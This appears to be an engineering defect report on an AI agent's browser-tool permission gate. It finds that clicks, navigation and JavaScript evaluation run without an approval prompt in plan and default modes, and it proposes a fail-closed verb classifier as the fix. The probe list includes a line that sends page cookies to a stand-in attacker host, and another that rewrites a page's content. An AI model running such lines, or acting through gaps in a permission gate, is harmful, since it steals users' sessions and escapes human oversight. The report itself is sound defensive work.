docRequirement: chrome.md:106 binds plan mode to a per-call split: "browser tool calls that only read the page or browser state run without a permission prompt, and calls that change state prompt for approval." chrome.md:108-109 enumerate the two classes (read-only: `read_page`, `get_page_text`, `find`, reading console messages or network requests, taking a screenshot; state-changing: clicks, typing, navigation, tab and window management, recording a GIF), and chrome.md:111 adds that a call whose input flag makes it state-changing also prompts and that "A `browser_batch` call runs without a prompt only when every action inside it is read-only." The binding is on the CALL, not on the tool name.
current: The permission gate never looks at the browser command. `packages/shared/src/agent/mode-manager.ts:2001` lists `'browser_tool'` in `ALWAYS_ALLOWED_TOOLS` (block comment at :1993 'Tools that are always allowed in any mode (read-only by nature)'), so the canonical name returns `{allowed:true}` at :2195 and the `mcp__session__`-namespaced form returns it at :2200-2203 via the `endsWith('__<allowedTool>')` loop. `packages/shared/src/agent/mode-manager.ts:2207-2210` is a second unconditional allow — `if (isBrowserToolNameOrAlias(toolName)) { return { allowed: true }; }` — catching the 19 legacy aliases in `packages/shared/src/agent/browser-tool-names.ts:10-30`. `plan` reaches both because `isInteractiveWritePermissionMode` (`packages/shared/src/agent/mode-types.ts:98-100`) covers only `default`/`acceptEdits`/`auto`, so plan falls into the read-only-allowlist branch commented at :2192. Neither path receives `toolInput`'s `command`. The tool really is one command-string tool — `BrowserToolSchema` (`packages/session-tools-core/src/tool-defs.ts:360-365`) takes `command: string | string[]`, and `executeBrowserToolCommand` (`packages/shared/src/agent/browser-tool-runtime.ts:622-647`) parses that one string into 32 verbs (`browser-tool-runtime.ts:694-1705`: open, navigate, snapshot, find, click, click-at, drag, fill, type, select, upload, set-clipboard, get-clipboard, paste, screenshot, screenshot-region, console, window-resize, network, wait, key, downloads, scroll, back, forward, evaluate, focus, windows, release, close, hide), and it also splits semicolon batches at `browser-tool-runtime.ts:642` (`splitBatchCommands`, :364) so `snapshot; click @e1` is one tool call. Probe of `shouldAllowToolInMode` on HEAD: in `plan`, `browser_tool` with `snapshot`, `click @e1`, `navigate https://example.com`, `evaluate document.body.innerHTML="pwned"`, `snapshot; click @e1`, and `mcp__session__browser_tool` with `evaluate fetch("https://evil.example/?c="+document.cookie)` all return exactly `{"allowed":true}` with no `requiresPermission`, while `Write` in the same mode returns `allowed:false`. Nothing downstream rescues it: `packages/shared/src/agent/core/pre-tool-use.ts` has zero occurrences of `browser` (`grep -a`), and its `mcp__` prompt branch at :1999-2021 uses `shouldAllowToolInMode(..., 'explore')` as its mutation oracle, so the explore allow makes `mcp__session__browser_tool` 'Read-only MCP tool — no prompt needed' (:2020) in `default` too. The only browser-specific pre-execution gate is the guide-read block at `packages/shared/src/agent/core/prerequisite-manager.ts:127-139`, which is mode-independent and not a prompt. The tool is exposed by default: `browserToolEnabled` defaults `true` (`packages/shared/src/config/storage.ts:179`, read by `getBrowserToolEnabled` at :1053) and exposure is filtered only by that flag (`packages/shared/src/agent/pi-agent.ts:1608-1611`), never by mode. The machinery for the fix already exists on both sides: plan mode can raise a negotiable prompt (`mode-manager.ts:2301-2307` returns `{allowed:true, requiresPermission:true, description, planShellReview:true}` for Bash, consumed at `pre-tool-use.ts:1345-1351` and :1609-1620, classifier-eligible at `pi-agent.ts:4066-4072`), and verb extraction from the same single string is already implemented for the overlay at `packages/server-core/src/domain/browser-tool-detection.ts:25-32`.
divergence: The tool-name → allow mapping is correct for the read-only class and wrong for the state-changing class: the classification step chrome.md:106 requires simply does not exist in the permission path, so all 32 verbs collapse onto one verdict. Three separate deltas. (1) In `plan`, state-changing verbs (open, navigate, click, click-at, drag, fill, type, select, upload, set-clipboard, paste, key, scroll, back, forward, evaluate, window-resize, focus, release, close, hide) must prompt and instead run silently. (2) chrome.md:111's batch rule is unimplemented: a semicolon batch is admitted on the tool name, so `snapshot; click @e1` runs promptless even though one action inside it changes state. (3) The doc's per-input-flag refinement has no analogue to violate in our verb set — our `console`/`network` readers have no `clear` and `screenshot` has no `save_to_disk` (`browser-tool-runtime.ts:1194-1237, 1322-1352, 1376-1418`) — so that clause costs nothing today but must not be re-introduced when a flag like `--clear` is added. Not a wrong key name and not a wrong value: the input is never read at all. Separately (NOT bound by chrome.md, which is plan-mode-only): the same two allows make `default` mode promptless for browser calls too, which contradicts mode-manager's own comment at :2178-2184 calling the browser tool 'PERMISSION-REQUIRED per tools-reference.md' twenty lines before allowing it unconditionally — and that citation is itself stale, because `tools-reference.md` fetched 2026-08-03 (465 lines) carries no browser or Chrome row at all.

change.what: Add the classifier next to the existing name helpers (mode-manager already imports this module at mode-manager.ts:27, so no new edge and no cycle). `BROWSER_READ_ONLY_COMMANDS = new Set(['help','--help','-h','snapshot','find','screenshot','screenshot-region','console','network','windows','wait','downloads','get-clipboard'])` — every other verb in browser-tool-runtime.ts:694-1705 is state-changing, and an UNKNOWN verb must classify as state-changing (fail closed) so a verb added to the runtime cannot silently bypass the gate. `isReadOnlyBrowserToolInput(toolInput: unknown): boolean` reads `toolInput.command` and must mirror executeBrowserToolCommand exactly: array form = one command whose verb is element 0 (no batch split, per browser-tool-runtime.ts:628-634); string form = `splitBatchCommands(trimmed)` then the first token of each sub-command, and EVERY sub-command must be read-only (chrome.md:111). A missing/empty/non-string-non-array `command` returns true — the runtime throws 'Missing command' before touching the page (browser-tool-runtime.ts:636-639, 629-631), so it cannot change state, and this keeps the existing `{}`-input call sites green.

Both are module-private today. Move them verbatim into browser-tool-names.ts (or a new sibling `browser-tool-command-parse.ts` that both import) and re-import them here. The gate MUST use the same parser as the executor — a second tokenizer would let a quoting difference classify `"snapshot; click @e1"` differently in the two places, which is the bypass. Do not have mode-manager import browser-tool-runtime.ts: that would drag the whole Electron-facing runtime into the permission path.

Two edits. (a) Delete the `'browser_tool',` member at :2001 (and its 'Browser automation tool (canonical wrapper)' comment) — with it gone, the canonical and `mcp__session__`-namespaced forms fall through :2195/:2200-2203 to the alias branch, which `isBrowserToolNameOrAlias` already covers, so there is exactly one decision site. (b) Replace the body at :2207-2210 with: read-only input → `{ allowed: true }`; state-changing input and `mode === 'plan' && options?.allowPlanShellReview` → `{ allowed: true, requiresPermission: true, description: <verb-naming message>, planShellReview: true }` — the same negotiable band Bash uses at :2301-2307, so the guardian may review it under `useAutoModeDuringPlan` and it prompts otherwise; state-changing input otherwise (i.e. `explore`, or a host-side caller in `plan` that did not pass `allowPlanShellReview`) → `{ allowed: false, reason: ... }`, mirroring Bash's fallback and strictly narrowing. Leave the `dontAsk` deny at :2184-2190 alone (it already denies), and fix its stale 'per tools-reference.md' citation while there — that page has no browser row.

Add a `browser_tool` branch before the final fallback. Without it the browser prompt falls to the generic return at :1807-1812, which sets `command: toolName` and `rememberablePrompt(toolName)` — so one 'don't ask again' click on `click @e1` would blanket-approve `evaluate` for the remember window, and the prompt row would read 'MCP: browser_tool' with the command invisible. The branch must set `command` to the browser command string (join the array form) and key `rememberablePrompt` on that string. Keep `promptType: 'mcp_mutation'`: it is already in the `PermissionRequestType` wire union, so no wire/schema change is needed.
Export `isReadOnlyBrowserToolInput` and `BROWSER_READ_ONLY_COMMANDS` alongside `LEGACY_BROWSER_TOOL_ALIASES`/`isBrowserToolNameOrAlias`. One line each.

blastRadius: This is the permission decision boundary — a named risk trigger in AGENTS.md. `shouldAllowToolInMode` has six production callers: `packages/shared/src/agent/core/pre-tool-use.ts:1146` (the model's own gate, the only one passing `allowPlanShellReview: true`, at :1157) and :2003 (the `default`/`acceptEdits` mutation oracle inside `shouldPromptInAskMode`); `packages/shared/src/agent/core/permission-manager.ts:252` (`evaluateToolCall`); and `packages/server-core/src/sessions/SessionManager.ts:4287`, :4588, :4771, :11028, :16404 — of which :4771 (the plugin-hook/capability gate) and :11028 (agent admission) pass no `allowPlanShellReview`, which is exactly why the state-changing branch must be gated on that option rather than returning `requiresPermission` unconditionally. THE ONE NON-OBVIOUS COUPLING: `pre-tool-use.ts:2003` asks `shouldAllowToolInMode(toolName, input, 'explore')` purely to decide 'is this MCP call a mutation'. The moment the classifier denies a state-changing browser command in `explore`, `mcp__session__browser_tool click @e1` becomes a mutation there and starts prompting in `default` and `acceptEdits` too — a real behaviour change on the fork's most-used mode, arriving as a side effect and NOT bound by chrome.md. It reaches only the namespaced form (which is the one actually exposed: `pi-agent.ts:1608-1611` ships `mcp__session__browser_tool`), so a plain `browser_tool` would stay silent in `default` — an asymmetry to decide deliberately, not discover. Prompt shaping is read by `pi-agent.ts:2956-2963` (`buildPermissionRequestSuggestions` offers a session `addRules` allow for `promptType === 'mcp_mutation' && toolName.startsWith('mcp__')` — for the browser that suggestion would be tool-wide, so consider suppressing it) and by `pi-agent.ts:4066-4072` (`planClassifierEligible`). The prompt type crosses the wire and is NOT changed by this fix: `PermissionRequestType` is declared in `packages/core/src/types/message.ts:718`, mirrored at `packages/shared/src/agent/backend/types.ts:113` and `packages/core/src/types/pi-harness-runtime.ts:221`, and validated at `packages/shared/src/protocol/pi-harness-runtime.ts:192` — reusing `mcp_mutation` keeps all four untouched. Tests that must be re-run: `packages/shared/src/agent/__tests__/browser-tools-permissions.test.ts`, `session-tool-safe-mode-permissions.test.ts:12-24` (lists `mcp__session__browser_tool` among read-only session tools, passes `{}` — stays green only because empty `command` classifies read-only), `dont-ask-mode.test.ts:109-113`, `mode-gate.test.ts:76`, `mode-manager-plan-shell-review.test.ts`, `browser-tool-names.test.ts`, and `packages/shared/src/agent/core/__tests__/pre-tool-use-checks.isolated.ts` (:300 passes `allowPlanShellReview`, :1495/:1688 assert `mcp_mutation`). `packages/session-tools-core/src/tool-defs.ts:1000` declares `browser_tool` `safeMode: 'allow'`, which agrees with today's wrong behaviour — but `safeMode` has NO production consumer (only the type at :913 and assertions in `tool-defs-filtering.test.ts:146-149` and `pi-agent-server/src/__tests__/harness-contract/pi-harness-baseline.test.ts:457` against a fixture JSON), so leave it alone rather than churn the harness fixture; it is metadata, not the gate. Adjacent and deliberately untouched: `getAllowRemoteEvaluate` gates `evaluate` for remote sessions at the executor (`apps/electron/src/main/browser-pane-manager.ts:2703`), which is a different layer and remote-only. No persistence boundary is crossed.
userImpact: Real and reachable by default, not latent. The browser tool ships enabled (`browserToolEnabled` default `true`, `packages/shared/src/config/storage.ts:179`) and is exposed in plan mode. A user presses SHIFT+TAB into Plan mode — whose whole promise is 'look, don't touch' — and asks the agent to investigate a page in the Browser pane. The agent may click buttons, fill and submit forms, upload local files to a file input, write the clipboard, navigate away, resize/close the window, or run arbitrary JavaScript via `evaluate` against a page where the user is already logged in, and the user is never asked: no approval row appears in the conversation, and no 'don't ask again' choice is offered because no prompt is raised. The overlay does light up for those verbs (`packages/server-core/src/domain/browser-tool-detection.ts:34-42`), so the user watches it happen after the fact instead of approving it beforehand. The same holds in `default` mode, where a plain-language expectation of an approval prompt for a state-changing browser action is likewise never met. The exposure is highest with a real logged-in browser session, where a single promptless `evaluate` can read cookies and page content and post them off-host.
